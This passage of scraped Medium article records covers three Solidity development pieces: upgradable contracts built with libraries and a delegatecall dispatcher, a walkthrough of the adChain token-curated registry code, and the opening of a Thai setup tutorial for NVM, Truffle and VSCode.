"vasa", "author_link": "https://medium.com/@vaibhavsaini_67863", "publish_date": "2018-12-16", "last_modified_date": "2018-12-28", "readtime": "7.85", "claps": 116, "voters": 20, "content": "How to Write Upgradable (Versioned) Smart Contracts in Solidity?A Complete Guide on Understanding and Implementing Upgradable Smart Contracts in Solidity using LibrariesvasaFollowDec 16, 2018 \u00b7 8 min readVersioning(Pseudo-Versioning) Smart ContractsImmutability is a feature that makes the Blockchain great.But like everything in this world, it also does have some cons.This article focuses on Reusability and Upgradeability of Smart Contracts in today\u2019s Blockchain platforms. We will mainly talk about Ethereum in this article, which is the most widely used smart contract platform today.But first Go make a cup of coffee\u2615 first, it\u2019s going to be a long one.We will start by seeing what are the reasons behind these restrictions/inabilities of current smart contract platforms. Then we will explore workarounds to model the Upgradeability(versioning) behavior(I call it Pseudo-Versioning) which we enjoy today in almost all of the centralized platforms.P.S. If you are really new to EVM(or want to learn about EVM in depth), then consider going through the below article.Getting Deep Into EVM: How Ethereum Works BackstageAn Ultimate, In-depth Explanation of What EVM is and How EVM Works.hackernoon.comOverviewSolidity(broadly speaking, EVM) has still a long way to go in terms of programmer productivity and language expressiveness. If you have worked with Ethereum, then by now you have probably realized thatSolidity is a limited language.Especially, when you come from the lands of Swift and Javascript, developing in Solidity is definitely a step back in terms of what the language allows the programmer to do and the expressiveness of the language.This can sometimes, piss you off.Even the Panda got pissed offBut Why it is Limited?Solidity, and in general languages that compile to bytecode intended to be executed in the EVM(which is a sandboxed), are limited because:When executed, your code will run on every node of the network. Once a node receives a new block, it will verify its integrity. In Ethereum this also means verifying that all the computations that happened on that block were performed correctly and the new state of contracts is correct.This causes that, even though the EVM is Turing-complete, heavy computations are expensive (or directly not allowed by the current gas limit) because every node will need to perform it, therefore slowing the network.A standard library hasn\u2019t really been developed yet. Arrays and strings are especially painful, I have personally had to implement my own string manipulation library in order to do basic stuff, that we take for granted otherwise.You cannot get data from the outside world (out of the EVM) unless it gets in via a transaction (Oracle) and once a contract is deployed it is not upgradable (you can plan for migrations or pure storage contracts, though).Some of this limitations are needed for the existence of the Ethereum computing platform (you will never be able to store a backup of your Google Photos and perform image recognition purely on-chain, and that is just fine). Other limitations are here just because it is a really young technology (though evolving blazingly fast) and it will keep improving over time.Ok. But how the F**k do I solve this problem?While working on a project, which needed changes in the contracts in future, I came across \u201clibrary\u201d. This is a feature of Solidity which helps us to solve(indirectly) this problem. Before going into the Upgradable contract implementation, let\u2019s see what is it and it\u2019s limitations.What are libraries and Why do we Need them?In Solidity, a library is a different type of contract, that doesn\u2019t have any storage and cannot hold ether. Sometimes it is helpful to think of a library as a singleton in the EVM, a piece of code that can be called from any contract without the need to deploy it again. This solves some big problems like:Deployment gas costs: This has the obvious benefit of saving substantial amounts of gas, because the same code doesn\u2019t have to be deployed over and over, and different contracts can just rely on the same already deployed library.Code repetition in the blockchain: This is obvious from the above point.Code Updates: Earlier bug fixes and updates need to be deployed independently on each project (or, even worse, Ethereum has to hard fork to fix a contract\u2019s problems). Now, it\u2019s solved.Libraries do sound awesome, right? Unfortunately, they also have some limitations. Below are some important things to know about libraries:Libraries don\u2019t have storage capabilities.Libraries can manipulate the storage of other contracts.Libraries cannot have payable functions.Libraries cannot have a fallback function.Libraries don\u2019t have an event log.Libraries can be used to fire event logs for the contract which uses it.Libraries aren\u2019t allowed to inherit.Even though libraries cannot directly inherit, they can be linked with other libraries and use them in the same way a contract would, but with the natural limitations of libraries.These points can sound confusing at first. Don\u2019t Panic. Here is a great resource to get your head around libraries.Library Driven Development in SolidityA comprehensive review on how to develop more modular, reusable and elegant smart contract systems on top of the\u2026medium.comBut for now, we will only cover the parts which we need to understand in order to understand/implement upgradable contracts.How does a Library work?A library is a type of contract that doesn\u2019t allow payable functions and cannot have a fallback function (these limitations are enforced at compile time, therefore making it impossible for a library to hold funds). A library is defined with the keyword library (library L{}) in the same way a contract is defined (contract C{}).Calling a function of a library will use a special instruction (DELEGATECALL), that will cause the calling context to be passed to the library as if it was code running in the contract itself. I really like this angle from the Solidity documentation,\u201cLibraries can be seen as implicit base contracts of the contracts that use them\u201dIn the above snippet, when function a() of contract C is called, the address of the contract will be returned and not the library's. This appears to be the same for all msg properties: msg.sender, msg.value, msg.sig, msg.data and msg.gas. (Solidity documentation related to this indicates otherwise, but after doing some testing it looks like msg context is maintained).One thing we can notice here is that it is not clear how class C and library L are linked. So, let\u2019s see that.How are libraries linked?Different from explicit base contract inheritance, (contract C is B {}) in a contract that depends on a library, it is not that clear how a contract gets linked with a library. In the above case, contract C uses library L in its function a(), but there is no mention of what address of the library to use, and L won't get compiled inside C's bytecode.Library linking happens at the bytecode level. When contract C is compiled, it leaves a placeholder for the library address in this way 0073__L_____________________________________630dbe671f(0dbe671f is the function signature for a()). If we were to deploy contract C untouched, the deployment would fail as the bytecode is invalid.In simple words, Library linking is as simple as replacing all occurrences of the library placeholder in the contract bytecode with the address of the deployed library in the blockchain. Once the contract is linked to the library, it can be deployed.Now as we have covered the basics of the library, let\u2019s see how we can use them to create upgradeable contracts.Library, themselves are not UpgradeableThey are not, in the same way, contracts aren\u2019t either. As stated in the previous section, the reference to the library is made at the bytecode level rather than at the storage level. Changing the bytecode of a contract is not allowed once deployed, therefore the reference to the library will live as long as the contract does.You must be asking that, then how does one introduce the \u201cupgradable\u201d feature that we have been talking about this whole time?Finally, How it Actually Works?Here is where a little trick comes in. Let\u2019s see this in detail:Model of Updatable ContractInstead of linking the main user-facing contract directly with the address of the deployed library, it is linked to a \u2018Dispatcher\u2019 contract. At compile and deploy time this is just fine because the Dispatcher doesn\u2019t implement any of the methods of the library. This means that as the Dispatcher contract doesn\u2019t use any library code in the contract itself, it\u2019s(Dispatcher contract) bytecode(like the bytecode for contract C which we saw above) doesn\u2019t have to include the library\u2019s address in its bytecode. So, as we are not hardcoding any address on the bytecode level, we can swap the library any time with a different one.But if we are not using any library code in the Dispatcher contract, then how do we execute the library functions?When a transaction comes in, the main contract(Token contract) thinks it is making a delegatecall to the library(TokenLib1) it is linked with. But this delegatecall will instead be made to the dispatcher(Dispatcher contract).Here is where things get interesting. Once the dispatcher catches the delegatecall in its fallback function it figures out what the correct version of the library code is, and redirects the call once again with a delegatecall. Once the library returns, the return will go all the way back to the main contract.This solution works great, but it has some minor limitations.LimitationsThe dispatcher needs to know what the memory size for the return of that library call is. Right now it is solved by having a mapping for function signatures to their return type size. This was intentionally kept out of the drawing for the sake of simplicity.Given the way delegatecall\u2019s work on the EVM level, you can only use it from one contract to another that has the same storage footprint. As libraries have no storage, we kept Dispatcher with no storage. That\u2019s why there is a separate DispatcherStorage to keep all the data it needs. Also, the address of the DispatcherStorage needs to be hardcoded in the Dispatcher contract\u2019s bytecode.Note that for the user-facing contract(Token contract) nothing special is needed, only that instead of being linked with the concrete version of the library, it has to be linked with the dispatcher.Here is the implementation of the solution:maraoz/solidity-proxySolidity implementation of a delegate proxy. Contribute to maraoz/solidity-proxy development by creating an account on\u2026github.comHappy Pseudo-Versioning!Sources:Jorge Izquierdo\u2019s article on Library Driven DevelopmentSimon de la Rouviere\u2019s article on ThrowProxyThanks for reading ;)About the AuthorVaibhav Saini is a Co-Founder of TowardsBlockchain, an MIT Cambridge Innovation Center incubated startup.He works as Senior blockchain developer and has worked on several blockchain platforms including Ethereum, Quorum, EOS, Nano, Hashgraph, IOTA etc.He is currently a sophomore at IIT Delhi.Learned something? Press and hold the \ud83d\udc4f to say \u201cthanks!\u201d and help others find this article.Hold down the clap button if you liked the content! It helps me gain exposure .Want to learn more? Checkout my previous articles.ConsensusPedia: An Encyclopedia of 30 Consensus AlgorithmsA complete list of all consensus algorithms.hackernoon.comContractPedia: An Encyclopedia of 40 Smart Contract PlatformsA Complete List of all Smart Contract supportive Platformshackernoon.comDifference between SideChains and State ChannelsA complete comparison of the two scaling methods.hackernoon.comEOS 101: Getting started with EOS, Part 1The only blockchain which has blocktime of less than a second: 0.5 sec!hackernoon.comClap 50 times and follow me on Twitter: @vasa_develop", "responses": 2, "tags": ["Ethereum", "Solidity", "Versioned Contracts", "Upgradable Contracts", "Smart Contracts"]}, {"title": "Dev Diary II: A Walkthrough of the adChain Registry TCR in Solidity", "post_link": "https://medium.com/metax-publication/a-walkthrough-of-the-adchain-registry-tcr-in-solidity-72addcde17fb?source=search_post", "author_name": "adChain", "author_link": "https://medium.com/@AdChain", "publish_date": "2017-11-13", "last_modified_date": "2018-06-13", "readtime": "9.23", "claps": 316, "voters": 21, "content": "Dev Diary II: A Walkthrough of the adChain Registry TCR in SolidityadChainFollowNov 13, 2017 \u00b7 10 min readRecommended reading: I previously dissected the implementation of PLCRVoting.sol developed for adChain. The first article provides helpful background to better understand the adChain Registry walkthrough.The adChain Registry is a token-curated registry (TCR). Excitingly, adChain\u2019s TCR implementation is highly generic! Just like our partial-lock commit/reveal (PLCR) voting code can be used for token voting with any ERC-20, the adChain Registry is generic to any TCR use case that authenticates listings as strings. If you don\u2019t know what token-curated registries are about in general, here are a few good articles on the topic.This article is about implementing a TCR. If you read the previous article on PLCR voting, you will be happy to know that implementing the rest of a token-curated registry is much simpler.What\u2019s in a TCR?A token-curated registry is, fundamentally, a lookup table. The system\u2019s hottest path is a view function for checking whether or not some key exists in the registry. This can be a simple public mapping for which solc\u2019s generated getter will suffice. The complexity, of course, will be in populating that mapping.The main game loop in a TCR is its application/challenge process. In this game loop a candidate puts down a deposit in the registry\u2019s intrinsic token to begin an application. After some period if no challenge is raised, the candidate can poke their application into listing status (and the deposit stays with the listing). If a challenge is raised against an application or a listing, a token-weighted vote begins. The voting logic is handled by the PLCR voting contract, while the registry updates listing and application statuses, and disburses rewards to winners on the basis of voting outcomes.There is also a system for parameterizing the TCR, but we\u2019ll save that for a future blog post.DeploymentA token-curated registry takes three constructor arguments to initialize its storage, all of which are contract addresses: the registry\u2019s intrinsic token, the PLCR voting instance it will rely on, and the parameterizer contract that provides the registry\u2019s system parameters. We\u2019ll see later how exactly all these things are used, but note for your own purposes that there are dependencies in the order for which these systems are deployed.ApplicationsWhen an unlisted candidate desires to acquire listing status in a registry, they will need to make an application. The apply function takes a string for the domain which is being applied, and an integer amount which is the number of tokens to deposit with the application.The apply function begins with some require checks. First, we\u2019ll call a helper function to make sure the domain being applied isn\u2019t already whitelisted. Next, we\u2019ll call another helper function to check whether an active application already exists for this domain, and throw an error if one does. Finally, we make sure that the amount of tokens specified as the deposit is at least the minimum specified by the TCR\u2019s parameterizer.We\u2019ll come back to some of these helper functions later to see how they actually work, but lets consider them abstract for now.If all the required checks pass, we\u2019ll instantiate a data structure called a Listing for this domain. Applications and Listings use the same data structure, and Listing structs contain a boolean called whitelisted to determine whether the contents of a listing have successfully completed the application process or not.First, we\u2019ll grab the location in storage for this domain\u2019s Listing struct in the listings mapping, and set the Listing\u2019s owner as the message sender of the function invocation (the address of the account that called the apply function). On line 95 we\u2019ll attempt to transfer the amount of tokens specified by the function caller from their account to the registry contract.Finally, we\u2019ll set the listing\u2019s application expiry date to the current time plus the parameterizer\u2019s applyStageLen, and set the listing\u2019s unstaked deposit to the specified token amount. The application expiry date is the date after which an application can be poked in whitelisted status if it hasn\u2019t been challenged. The unstaked deposit is the number of tokens in a listing which are not locked up in a challenge at any given time.We fire an event to notify any curious client applications, and then we\u2019re done! We\u2019ve made an application to the adChain TCR.Now we\u2019ll look at what happens when a challenge is made against an application.ChallengesThe challenge method accepts a single argument, the string-encoded name of the domain to be challenged (which is the key to a Listing struct in the listings map). After initializing some local variables, including a pointer to storage for the listing being challenged, we perform some require checks.First we\u2019ll make sure a Listing struct exists for the provided string. If there isn\u2019t one, there is nothing to challenge! The next check we do is to ensure that only one challenge can exist per listing at any given time. To do this, we\u2019ll grab the listing\u2019s challenge ID and use it to index into a mapping of challenges. Then, using Solidity\u2019s method-like syntax for library data structures, we\u2019ll require that either no challenge exists for the listing, or that it has been resolved if one does.We learned about Solidity\u2019s facility for pseudo-object-oriented programming with our DLL and AttributeStore data structures in the PLCR voting walkthrough, so we won\u2019t retread too much ground on the mechanics of that here. We use an external library for itsthe Challenges data structure, as because our parameterizer uses the exact same mechanism, so and a library helps us to not write duplicate code. A Challenge struct contains a lot of information.We have special logic to capture the touch-and-remove TCR edge case beginning on line 180. If the listing\u2019s unstaked deposit is less than the TCR\u2019s current MIN_DEPOSIT, we execute the touch-and-remove by calling a helper function resetListing, which transfers any unstaked deposit in the listing to its owner and deletes the listing from the listings map.Let\u2019s assume the MIN_DEPOSIT has not changed since application time, so we won\u2019t hit that edge case. Notice though that this is exactly why we allow users to specify deposits greater than MIN_DEPOSIT, so as to guard against situations like that! To continue, on line 187 we transfer tokens from the challenger (the message sender) to the registry contract equal to the required MIN_DEPOSIT.Next we initialize some data structures. We create a new poll in our PLCR contract and capture its poll ID. Then we initialize a new Challenge struct. Most of the struct members are self-explanatory except for perhaps rewardPool and winningTokens. The rewardPool is the absolute number of tokens which will be available for voter rewards when the challenge is resolved. winningTokens is (eventually) the absolute number of tokens which were committed for the winning side of the vote. We\u2019ll see later how these two struct members are used to compute voter payouts by token weight.After instantiating those data structures we\u2019ll add the new challenge to the challenged domain\u2019s Listing struct by its challenge ID (which corresponds to a PLCR poll ID), and decrement the listing\u2019s unstaked deposit by the deposit amount of the challenger. This prevents the challenged listing\u2019s owner from withdrawing their stake while the challenge remains unresolved.VotingVoting is delegated to the registry\u2019s PLCR voting contract, the address of which is stored in the state variable called voting. Client software should find and expose the polls that correspond to open challenges and expose these to users for commit/reveal voting. PLCR voting was discussed in a previous article so we\u2019ll blackbox it and assume the following for the purposes of our walkthrough: a vote was concluded in which two deposits of 100 tokens each were at stake. The challenger won the challenge, with 200 tokens voting in support of the challenge and 100 tokens voting against. The registry\u2019s DISPENSATION_PCT is 50.Resolving a challengeOnce a Challenge\u2019s reveal stage has ended, the registry\u2019s updateStatus function can be called for the challenged domain.updateStatus is a general routing function that will branch us off into more specific logic depending on the state of the domain whose status is being updated. The first thing we\u2019re going to check is if the provided domain canBeWhitelisted.We\u2019re going to check four things in canBeWhitelisted: does an application exist and, if so, has its expiry date passed and, if so, is this not already whitelisted and, if so, does a challenge either not exist or, if one does exist, has it been resolved? If that entire boolean statement evaluates as true, the domain can be whitelisted. Our domain will fail the final test, however: a challenge does exist and it has not been resolved. So we proceed to the next check: challengeCanBeResolved.challengeCanBeResolved is a simple wrapper function that calls the Challenge\u2019s canBeResolved method. This method checks with the PLCR contract to see whether voting for the challenge\u2019s poll has been concluded and that this challenge has not already been resolved. In our case, this will all be true, so we proceed to our registry\u2019s resolveChallenge function.The resolveChallenge function is private, and operates on the internal state of a Challenge struct. It\u2019s a somewhat complex function, and dangerous! Lets use it to resolve our challenge.The first thing we do is get pointers to our Listing and Challenge structs in storage, since we\u2019ll be using them a lot. Then we\u2019ll create a variable called winnerReward which is computed by the challengeWinnerReward method of the Challenge struct.The first thing challengeWinnerReward does is handle an edge case: if nobody voted in the poll, give all of the loser\u2019s stake to the winner (as opposed to burning the portion that would otherwise be reserved for voters). We don\u2019t hit this edge case in our example, so we return twice the stake minus the amount of the reward pool (which, recall, is the number of tokens reserved for voters on the winning side). So we return the challenge winner\u2019s stake plus their special dispensation of the loser\u2019s stake.After computing that we\u2019ll set a local bool wasWhitelisted. The only use of this variable will be to help us fire more informative events.Next we\u2019ll check whether the challenge succeeded or failed using the isPassed method of our PLCR contract. If the application \u201cpassed\u201d, that means the challenge failed. In our case the application did not pass, so we\u2019ll jump to the else clause on line 366.In this clause we reset the listing, which removes the struct from storage (or de-initializes it, really) and transfers any tokens that weren\u2019t staked in the challenge back to the listing owner. Then we transfer the winnerTokens to the challenge winner and fire some events.Finally, and irrespective of whether the challenge was won or lost, we\u2019ll set the the Challenge\u2019s winningTokens to the result of the PLCR contracts getTotalNumberOfTokensForWinningOption method and set the Challenge\u2019s resolved member to true. Note that even though we\u2019ve deleted the Listing from storage, the Challenge remains!The aftermath: voters claiming rewardsAfter a challenge has been resolved, voters on the winning side will want to claim their spoils. Remember that rewards come from the forfeited deposit of the losing party in the challenge, which was always in the custody of the registry contract. To withdraw the principal tokens a voter actually used to vote with, they\u2019ll need to interact with the PLCR contract itself. To claim rewards, voters use the claimReward function, which is a thin wrapper around the Challenge\u2019s claimReward method.A Challenge struct includes a mapping of addresses to bools called tokenClaims. tokenClaims are initialized as false, and we\u2019ll set them to true as token holders come in to claim their rewards. The first thing we check in a claimReward call is that the voter has not already claimed a reward. We also check that the challenge being claimed for has actually been resolved.Next we\u2019ll set two local variables. The first is just the number of tokens the voter has committed on the winning side of the vote, and is computed by the PLCR contract\u2019s getNumPassingTokens function. Then we set a variable called reward, computed by the Challenge\u2019s own voterReward method.voterReward divides the product of the voter\u2019s winning tokens and the reward pool by the absolute number of winning tokens. In our example the reward pool will be 50 tokens, since 100 tokens were at stake and the special dispensation is 50. We\u2019ll say this voter committed 50 out of 200 tokens to the winning side. So the product of their 50 tokens and the reward pool is 2500, divided by the winning tokens (200) is 12.5. We don\u2019t handle fractional amounts, so reward will end up as 12 (a luckier claimant will end up taking that .5 home eventually).Once we\u2019ve gotten the number of winning tokens the voter committed and calculated their reward, we\u2019ll deduct their tokens from the Challenge\u2019s winningTokens and deduct their reward from the rewardPool. This keeps the proportionality of token allocations correct as future claimants come in to claim their spoils. Finally we transfer the reward to the voter and set the voter\u2019s key in the tokenClaims mapping to true. We\u2019re done!We didn\u2019t cover absolutely everything the adChain TCR does, but we covered a path that touched most of the codebase and certainly hit the most complex parts.Improving the adChain TCRThe code reviewed here has been frozen for audit, but we hope to make one significant further improvement to be audited as an increment on the initial report.The adChain TCR has many different event types. This is to help clients like app.adChain.com populate user views. This approach requires a persistent server that listens for contract events and feeds them to intermittently connected clients. Preferable would be an iterable data structure that a client can call to get the complete set of listed items. The listings map as-is cannot be iterated, so we imagine adding a doubly-linked list like that used in PLCR voting which can be iterated by clients.Massive props to ConsenSys 2017 interns Irene Lin, Mira Zeitlin and Terry Li for working so hard this summer to make the token-curated registry dream a reality.", "responses": 1, "tags": ["Blockchain", "Ethereum", "Solidity", "Adchain Dev Updates"]}, {"title": "[Ethereum] \u0e15\u0e2d\u0e19\u0e17\u0e35\u0e48 1 : \u0e15\u0e34\u0e14\u0e15\u0e31\u0e49\u0e07\u0e40\u0e04\u0e23\u0e37\u0e48\u0e2d\u0e07\u0e43\u0e2b\u0e49\u0e1e\u0e23\u0e49\u0e2d\u0e21\u0e40\u0e02\u0e35\u0e22\u0e19\u0e20\u0e32\u0e29\u0e32 Solidity \u0e14\u0e49\u0e27\u0e22 VSCode, Truffle, Infura \u0e41\u0e25\u0e30 Ganache", "post_link": "https://medium.com/cochain/ethereum-%E0%B8%95%E0%B8%AD%E0%B8%99%E0%B8%97%E0%B8%B5%E0%B9%88-1-%E0%B8%95%E0%B8%B4%E0%B8%94%E0%B8%95%E0%B8%B1%E0%B9%89%E0%B8%87%E0%B9%80%E0%B8%84%E0%B8%A3%E0%B8%B7%E0%B9%88%E0%B8%AD%E0%B8%87%E0%B9%83%E0%B8%AB%E0%B9%89%E0%B8%9E%E0%B8%A3%E0%B9%89%E0%B8%AD%E0%B8%A1%E0%B9%80%E0%B8%82%E0%B8%B5%E0%B8%A2%E0%B8%99%E0%B8%A0%E0%B8%B2%E0%B8%A9%E0%B8%B2-solidity-%E0%B8%94%E0%B9%89%E0%B8%A7%E0%B8%A2-vscode-truffle-infura-%E0%B9%81%E0%B8%A5%E0%B8%B0-1af5189650c4?source=search_post", "author_name": "Methus Kaewsaikao", "author_link": "https://medium.com/@methuz", "publish_date": "2019-05-09", "last_modified_date": "2019-05-09", "readtime": "4.58", "claps": 220, "voters": 22, "content": "[Ethereum] \u0e15\u0e2d\u0e19\u0e17\u0e35\u0e48 1 : \u0e15\u0e34\u0e14\u0e15\u0e31\u0e49\u0e07\u0e40\u0e04\u0e23\u0e37\u0e48\u0e2d\u0e07\u0e43\u0e2b\u0e49\u0e1e\u0e23\u0e49\u0e2d\u0e21\u0e40\u0e02\u0e35\u0e22\u0e19\u0e20\u0e32\u0e29\u0e32 Solidity \u0e14\u0e49\u0e27\u0e22 VSCode, Truffle, Infura \u0e41\u0e25\u0e30 GanacheMethus KaewsaikaoFollowMay 9 \u00b7 5 min read\u0e43\u0e19\u0e1a\u0e17\u0e19\u0e35\u0e49\u0e40\u0e23\u0e32\u0e08\u0e30\u0e21\u0e32\u0e15\u0e34\u0e14\u0e15\u0e31\u0e49\u0e07\u0e42\u0e1b\u0e23\u0e41\u0e01\u0e23\u0e21\u0e15\u0e48\u0e32\u0e07 \u0e46 \u0e17\u0e35\u0e48\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19 Smart Contract \u0e1a\u0e19 Ethereum \u0e14\u0e49\u0e27\u0e22\u0e20\u0e32\u0e29\u0e32 Solidity \u0e01\u0e31\u0e19\u0e04\u0e23\u0e31\u0e1a\u0e42\u0e14\u0e22\u0e40\u0e19\u0e37\u0e49\u0e2d\u0e2b\u0e32\u0e08\u0e30\u0e1b\u0e23\u0e30\u0e01\u0e2d\u0e1a\u0e44\u0e1b\u0e14\u0e49\u0e27\u0e22NVM \u0e41\u0e25\u0e30 NodeJSTruffleMetamaskInfuraGanache\u0e25\u0e2d\u0e07 Deploy Smart Contract \u0e02\u0e36\u0e49\u0e19\u0e44\u0e1b\u0e1a\u0e19 Chain1. NVM \u0e41\u0e25\u0e30 NodeJS\u0e02\u0e2d\u0e2d\u0e18\u0e34\u0e1a\u0e32\u0e22\u0e2a\u0e31\u0e49\u0e19 \u0e46 \u0e2a\u0e33\u0e2b\u0e23\u0e31\u0e1a\u0e04\u0e19\u0e17\u0e35\u0e48\u0e44\u0e21\u0e48\u0e44\u0e14\u0e49\u0e40\u0e02\u0e35\u0e22\u0e19 NodeJS \u0e21\u0e32\u0e01\u0e48\u0e2d\u0e19\u0e41\u0e25\u0e30\u0e2d\u0e32\u0e08\u0e08\u0e30\u0e44\u0e21\u0e48\u0e21\u0e35 Node \u0e43\u0e19\u0e40\u0e04\u0e23\u0e37\u0e48\u0e2d\u0e07NodeJS \u0e2b\u0e23\u0e37\u0e2d\u0e40\u0e23\u0e35\u0e22\u0e01\u0e2a\u0e31\u0e49\u0e19 \u0e46 \u0e27\u0e48\u0e32 Node \u0e04\u0e37\u0e2d Javascript Runtime Environment \u0e1e\u0e39\u0e14\u0e07\u0e48\u0e32\u0e22 \u0e46 \u0e01\u0e47\u0e04\u0e37\u0e2d\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e31\u0e27\u0e23\u0e31\u0e19\u0e20\u0e32\u0e29\u0e32 Javascript \u0e17\u0e35\u0e48 Server \u0e2a\u0e32\u0e40\u0e2b\u0e15\u0e38\u0e17\u0e35\u0e48\u0e40\u0e23\u0e32\u0e15\u0e49\u0e2d\u0e07\u0e43\u0e0a\u0e49\u0e40\u0e1e\u0e23\u0e32\u0e30\u0e27\u0e48\u0e32 Truffle \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e1b\u0e47\u0e19 Framework \u0e17\u0e35\u0e48\u0e19\u0e34\u0e22\u0e21\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19 Solidity \u0e08\u0e33\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e49\u0e2d\u0e07\u0e43\u0e0a\u0e49 Node \u0e04\u0e23\u0e31\u0e1aNVM \u0e04\u0e37\u0e2d Version Manager \u0e02\u0e2d\u0e07 Node \u0e40\u0e19\u0e37\u0e48\u0e2d\u0e07\u0e08\u0e32\u0e01\u0e1a\u0e32\u0e07\u0e04\u0e23\u0e31\u0e49\u0e07\u0e01\u0e32\u0e23\u0e17\u0e33\u0e07\u0e32\u0e19\u0e40\u0e23\u0e32\u0e08\u0e30\u0e15\u0e49\u0e2d\u0e07\u0e43\u0e0a\u0e49 Node \u0e41\u0e15\u0e01\u0e15\u0e48\u0e32\u0e07\u0e40\u0e27\u0e2d\u0e23\u0e4c\u0e0a\u0e31\u0e19\u0e01\u0e31\u0e19\u0e44\u0e1b\u0e43\u0e19\u0e41\u0e15\u0e48\u0e25\u0e30\u0e42\u0e1b\u0e23\u0e40\u0e08\u0e47\u0e04 \u0e01\u0e32\u0e23\u0e43\u0e0a\u0e49 NVM \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e40\u0e1b\u0e25\u0e35\u0e48\u0e22\u0e19\u0e40\u0e27\u0e2d\u0e23\u0e4c\u0e0a\u0e31\u0e19\u0e44\u0e1b\u0e21\u0e32\u0e44\u0e14\u0e49\u0e07\u0e48\u0e32\u0e22\u0e02\u0e36\u0e49\u0e19\u0e25\u0e07 NVMcurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.34.0/install.sh | bash\u0e43\u0e0a\u0e49 NVM \u0e25\u0e07 Node 10.15nvm install 10.15nvm use 10.15\u0e25\u0e2d\u0e07\u0e17\u0e14\u0e2a\u0e2d\u0e1a\u0e14\u0e49\u0e27\u0e22\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e15\u0e32\u0e21\u0e20\u0e32\u0e1e2. Truffle\u0e15\u0e48\u0e2d\u0e44\u0e1b\u0e40\u0e23\u0e32\u0e08\u0e30\u0e25\u0e07 Framework \u0e0a\u0e37\u0e48\u0e2d Truffle \u0e0b\u0e36\u0e48\u0e07\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23 Develop Solidity \u0e0b\u0e36\u0e48\u0e07\u0e08\u0e23\u0e34\u0e07 \u0e46 \u0e41\u0e25\u0e49\u0e27\u0e40\u0e23\u0e32\u0e08\u0e30\u0e44\u0e21\u0e48\u0e43\u0e0a\u0e49 Truffle \u0e40\u0e25\u0e22\u0e01\u0e47\u0e44\u0e14\u0e49 \u0e40\u0e0a\u0e48\u0e19\u0e43\u0e0a\u0e49 Remix IDE \u0e41\u0e15\u0e48 Truffle \u0e0a\u0e48\u0e27\u0e22\u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32\u0e17\u0e33\u0e07\u0e32\u0e19\u0e44\u0e14\u0e49\u0e07\u0e48\u0e32\u0e22\u0e02\u0e36\u0e49\u0e19\u0e40\u0e1e\u0e23\u0e32\u0e30\u0e40\u0e02\u0e35\u0e22\u0e19\u0e40\u0e17\u0e2a\u0e44\u0e14\u0e49\u0e17\u0e33 Migration \u0e44\u0e14\u0e49\u0e15\u0e48\u0e2d\u0e01\u0e31\u0e1a Ethereum Chain \u0e15\u0e48\u0e32\u0e07 \u0e46 \u0e44\u0e14\u0e49\u0e07\u0e48\u0e32\u0e22\u0e17\u0e33 Plugin, \u0e40\u0e02\u0e35\u0e22\u0e19 Pipeline \u0e44\u0e14\u0e49\u0e21\u0e35 Console \u0e43\u0e2b\u0e49 Interact \u0e01\u0e31\u0e1a Contract \u0e17\u0e35\u0e48 Deploy \u0e44\u0e1b\u0e41\u0e25\u0e49\u0e27\u0e44\u0e14\u0e49\u0e07\u0e48\u0e32\u0e22\u0e1b\u0e25. \u0e2a\u0e34\u0e48\u0e07\u0e17\u0e35\u0e48 Truffle \u0e44\u0e21\u0e48\u0e21\u0e35\u0e41\u0e15\u0e48 Remix IDE \u0e21\u0e35\u0e2b\u0e25\u0e31\u0e01 \u0e46 \u0e01\u0e47\u0e04\u0e37\u0e2d Debugger \u0e41\u0e15\u0e48\u0e40\u0e23\u0e32\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e25\u0e07\u0e41\u0e22\u0e01\u0e44\u0e14\u0e49\u0e43\u0e19 VSCode\u0e1b\u0e25. 2 \u0e08\u0e23\u0e34\u0e07 \u0e46 \u0e41\u0e25\u0e49\u0e27\u0e01\u0e32\u0e23\u0e40\u0e17\u0e35\u0e22\u0e1a Truffle \u0e01\u0e31\u0e1a Remix \u0e19\u0e31\u0e49\u0e19\u0e44\u0e21\u0e48\u0e16\u0e39\u0e01\u0e19\u0e31\u0e01 \u0e04\u0e27\u0e23\u0e08\u0e30\u0e40\u0e17\u0e35\u0e22\u0e1a Remix \u0e01\u0e31\u0e1a VScode \u0e08\u0e30\u0e40\u0e2b\u0e21\u0e32\u0e30\u0e01\u0e27\u0e48\u0e32\u0e2b\u0e19\u0e49\u0e32\u0e15\u0e32\u0e02\u0e2d\u0e07 RemixIDE \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e23\u0e32\u0e08\u0e30\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e1a\u0e32\u0e07\u0e01\u0e23\u0e13\u0e35\u0e2b\u0e19\u0e49\u0e32\u0e15\u0e32\u0e02\u0e2d\u0e07 VSCode + Solidity Plugin + Truffle Project (\u0e14\u0e49\u0e32\u0e19\u0e0b\u0e49\u0e32\u0e22)\u0e1b\u0e25 3. \u0e2a\u0e32\u0e40\u0e2b\u0e15\u0e38\u0e17\u0e35\u0e48\u0e1c\u0e21\u0e43\u0e0a\u0e49 VSCode \u0e2b\u0e25\u0e31\u0e01 \u0e46 \u0e40\u0e1e\u0e23\u0e32\u0e30\u0e21\u0e35 Vim Mode 55555 \u0e2a\u0e48\u0e27\u0e19\u0e43\u0e04\u0e23\u0e08\u0e30\u0e43\u0e0a\u0e49\u0e15\u0e31\u0e27\u0e44\u0e2b\u0e19\u0e40\u0e02\u0e35\u0e22\u0e19\u0e01\u0e47\u0e44\u0e14\u0e49 \u0e41\u0e04\u0e48\u0e2b\u0e32 Plugin \u0e43\u0e19\u0e01\u0e32\u0e23 Highligh Syntax \u0e02\u0e2d\u0e07 Solidity 